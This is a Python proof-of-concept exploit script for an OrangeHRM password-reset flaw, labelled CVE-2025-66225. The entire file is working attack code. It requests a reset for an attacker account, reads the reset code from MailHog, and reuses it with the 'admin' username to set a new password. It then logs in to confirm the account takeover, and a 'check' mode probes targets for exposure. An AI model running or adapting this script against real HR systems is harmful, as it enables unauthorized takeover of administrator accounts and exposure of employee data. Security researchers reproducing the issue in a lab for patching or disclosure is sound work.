#!/usr/bin/env python3
import requests
import sys
import re
import time
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class OrangeHRMExploit:
    def __init__(self, base_url, mailhog_url="http://localhost:8025"):
        self.base_url = base_url.rstrip('/')
        self.mailhog_url = mailhog_url.rstrip('/')
        self.session = requests.Session()
        self.session.verify = False
    
    def get_csrf_token(self, url):
        resp = self.session.get(url, timeout=30)
        match = re.search(r':token="&quot;([^&]+)&quot;"', resp.text)
        if match:
            return match.group(1)
        return None
    
    def request_password_reset(self, username):
        get_url = f"{self.base_url}/web/index.php/auth/requestPasswordResetCode"
        token = self.get_csrf_token(get_url)
        if not token:
            print("[-] Failed to get CSRF token")
            return False
        
        post_url = f"{self.base_url}/web/index.php/auth/requestResetPassword"
        data = {"_token": token, "username": username}
        resp = self.session.post(post_url, data=data, timeout=30, allow_redirects=True)
        
        if resp.status_code in [200, 302] or "sendPasswordReset" in resp.url:
            print(f"[+] Password reset requested for: {username}")
            return True
        return False
    
    def get_reset_token_from_mailhog(self, email):
        time.sleep(3)
        try:
            resp = requests.get(f"{self.mailhog_url}/api/v2/messages", timeout=10)
            data = resp.json()
            
            for msg in data.get("items", []):
                raw = msg.get("Raw", {}).get("Data", "")
                raw = raw.replace("=\r\n", "").replace("=\n", "")
                
                if email.lower() in raw.lower():
                    match = re.search(r'resetCode/([A-Za-z0-9_-]+)', raw)
                    if match:
                        return match.group(1)
        except Exception as e:
            print(f"[-] MailHog error: {e}")
        return None
    
    def exploit_reset_password(self, reset_code, target_username, new_password):
        code_url = f"{self.base_url}/web/index.php/auth/resetPassword/resetCode/{reset_code}"
        resp = self.session.get(code_url, timeout=30)
        
        if resp.status_code != 200:
            print(f"[-] Reset code invalid: {resp.status_code}")
            return False
        
        token = self.get_csrf_token(code_url)
        
        reset_url = f"{self.base_url}/web/index.php/auth/resetPassword"
        data = {
            "_token": token or "",
            "username": target_username,
            "password": new_password,
            "confirmPassword": new_password
        }
        
        print(f"[*] Exploiting: changing username to '{target_username}'")
        resp = self.session.post(reset_url, data=data, timeout=30, allow_redirects=True)
        return resp.status_code in [200, 302]
    
    def verify_login(self, username, password):
        self.session = requests.Session()
        self.session.verify = False
        
        login_page = f"{self.base_url}/web/index.php/auth/login"
        token = self.get_csrf_token(login_page)
        
        validate_url = f"{self.base_url}/web/index.php/auth/validate"
        data = {"_token": token or "", "username": username, "password": password}
        resp = self.session.post(validate_url, data=data, timeout=30, allow_redirects=True)
        
        if "dashboard" in resp.url.lower() or "pim" in resp.url.lower():
            return True
        if "/auth/login" not in resp.url:
            return True
        return False


def exploit(base_url, mailhog_url="http://localhost:8025"):
    print("=" * 60)
    print("CVE-2025-66225: OrangeHRM Password Reset Account Takeover")
    print("=" * 60)
    
    exp = OrangeHRMExploit(base_url, mailhog_url)
    
    attacker_user = "attacker"
    attacker_email = "attacker@test.com"
    target_user = "admin"
    new_password = "Hacked@123"
    
    print(f"\n[*] Target: {base_url}")
    print(f"[*] Attacker: {attacker_user} ({attacker_email})")
    print(f"[*] Victim: {target_user}")
    
    print("\n[Step 1] Request password reset for attacker account")
    if not exp.request_password_reset(attacker_user):
        return False
    
    print("\n[Step 2] Get reset token from MailHog")
    reset_token = exp.get_reset_token_from_mailhog(attacker_email)
    if not reset_token:
        print("[-] Failed to get reset token")
        return False
    print(f"[+] Got reset token: {reset_token[:40]}...")
    
    print("\n[Step 3] Exploit - submit reset with victim's username")
    if not exp.exploit_reset_password(reset_token, target_user, new_password):
        print("[-] Exploit failed")
        return False
    print(f"[+] Password reset submitted for: {target_user}")
    
    print("\n[Step 4] Verify victim account takeover")
    time.sleep(1)
    if exp.verify_login(target_user, new_password):
        print(f"[+] SUCCESS! Logged in as '{target_user}' with password '{new_password}'")
        print(f"[+] VULNERABILITY CONFIRMED - Account Takeover Achieved")
        return True
    else:
        print("[-] Login verification failed")
        return False


def check(base_url):
    print("=" * 60)
    print("CVE-2025-66225: Vulnerability Check")
    print("=" * 60)
    print(f"\n[*] Target: {base_url}")
    
    try:
        resp = requests.get(f"{base_url}/web/index.php/auth/login", timeout=10, verify=False)
        if resp.status_code == 200:
            print("[+] Target accessible")
        resp = requests.get(f"{base_url}/web/index.php/auth/requestPasswordResetCode", 
                          timeout=10, verify=False)
        if resp.status_code == 200:
            print("[+] Password reset endpoint accessible")
            print("[!] Target may be vulnerable")
            return True
    except Exception as e:
        print(f"[-] Error: {e}")
    return False


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <url> [check|exploit]")
        sys.exit(1)
    
    url = sys.argv[1]
    mode = sys.argv[2] if len(sys.argv) > 2 else "check"
    
    if mode == "check":
        sys.exit(0 if check(url) else 1)
    elif mode == "exploit":
        sys.exit(0 if exploit(url) else 1)
